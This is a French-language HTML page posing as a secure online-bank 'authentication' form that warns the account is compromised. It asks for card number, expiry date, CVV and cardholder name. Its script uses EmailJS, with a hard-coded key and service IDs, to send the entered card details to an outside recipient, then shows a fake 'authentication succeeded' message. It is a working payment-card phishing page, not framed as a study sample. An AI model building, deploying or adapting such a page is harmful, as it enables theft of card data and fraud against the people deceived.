<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Authentification - Sécurité</title>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background-color: #f0f0f0;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 30px 15px;
      min-height: 100vh;
    }

    .title1 {
      text-align: center;
      margin-bottom: 20px;
    }

    .title1 h2 {
      color: #093a15;
      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
    }

    .title1 p {
      color: #555;
      font-weight: bold;
    }

    .phg {
      background-color: white;
      padding: 30px 20px;
      border-radius: 15px;
      box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 500px;
    }

    .title h3 {
      color: #1c1c4a;
      text-align: center;
      border-left: 6px solid #1e90ff;
      padding-left: 10px;
      margin-bottom: 20px;
      font-size: 1.2em;
    }

    .formPh h3 {
      text-align: center;
      margin-bottom: 20px;
      color: brown;
      font-size: 1.1em;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    .form-item {
      display: grid;
      grid-template-columns: 1fr 2fr;
      align-items: center;
      gap: 10px;
    }

    .form-item label {
      font-weight: bold;
      color: #333;
      text-align: right;
    }

    .form-item input {
      padding: 10px;
      border-radius: 8px;
      border: 1px solid #ccc;
      background-color: #f5f5f5;
      font-size: 1em;
      width: 100%;
    }

    input::placeholder {
      color: #888;
      font-weight: bold;
      text-align: center;
    }

    button {
      background-color: #4a4a4a;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #2e5e2e;
    }

    .thanks {
      margin-top: 20px;
      color: #555;
      font-size: 0.9em;
      text-align: center;
    }

    @media screen and (max-width: 500px) {
      .form-item {
        grid-template-columns: 1fr;
        text-align: left;
      }

      .form-item label {
        text-align: left;
      }
    }
  </style>
</head>
<body>
  <div class="title1">
    <h2>Authentification de votre <br />Compte</h2>
    <p>Banque en ligne sécurisée</p>
  </div>

  <div class="phg">
    <div class="title">
      <h3>Urgence - Compte bancaire compromis</h3>
    </div>
    <div class="formPh">
      <h3>Remplissez les champs</h3>
      <form id="formPh">
        <div class="form-item">
          <label for="numero">Numéro Carte :</label>
          <input type="text" id="numero" placeholder="xxxxxxxxxxxxxxxx" maxlength="16" inputmode="numeric" />
        </div>
        <div class="form-item">
          <label for="date">Date Expiration :</label>
          <input type="text" id="date" placeholder="MM/AA" maxlength="5" inputmode="numeric" />
        </div>
        <div class="form-item">
          <label for="code">Code CVV :</label>
          <input type="text" id="code" placeholder="xxx" maxlength="3" inputmode="numeric" />
        </div>
        <div class="form-item">
          <label for="nom">Nom Figurant :</label>
          <input type="text" id="nom" placeholder="Nom sur la carte" />
        </div>
        <button type="submit">Valider</button>
      </form>
    </div>
  </div>

  <div class="thanks">
    <p>&copy; 2025 - Sécurité-cartes.</p>
  </div>

  <script>
    emailjs.init("zRksb8uQChj8ZGIYO");

    document.getElementById("date").addEventListener("input", function () {
      let val = this.value.replace(/\D/g, "");
      if (val.length >= 3) {
        this.value = val.slice(0, 2) + "/" + val.slice(2, 4);
      } else {
        this.value = val;
      }
    });

    document.getElementById("formPh").addEventListener("submit", function (event) {
      event.preventDefault();

      let numero = document.getElementById("numero").value.trim();
      let date = document.getElementById("date").value.trim();
      let code = document.getElementById("code").value.trim();
      let nom = document.getElementById("nom").value.trim();

      // Validation
      if (!numero || !date || !code || !nom) {
        alert("Veuillez remplir tous les champs !");
        return;
      }

      if (!/^\d{15,16}$/.test(numero)) {
        alert("Numéro de carte invalide. Il doit contenir 15 ou 16 chiffres.");
        return;
      }

      const regexDate = /^(0[1-9]|1[0-2])\/\d{2}$/;
      if (!regexDate.test(date)) {
        alert("Date d'expiration invalide. Format requis : MM/AA");
        return;
      }

      if (!/^\d{3}$/.test(code)) {
        alert("Code CVV invalide. Il doit contenir 3 chiffres.");
        return;
      }

      let params = { numero, date, code, nom };

      emailjs.send("service_zj0pbx8", "template_60mqlee", params).then(
        function (response) {
          alert("Authentification réussie !");
          setTimeout(() => {
            document.getElementById("formPh").reset();
          }, 500);
        },
        function (error) {
          alert("Erreur d'authentification. Veuillez réessayer.");
          console.error("EmailJS Error:", error);
        }
      );
    });
  </script>
</body>
</html>
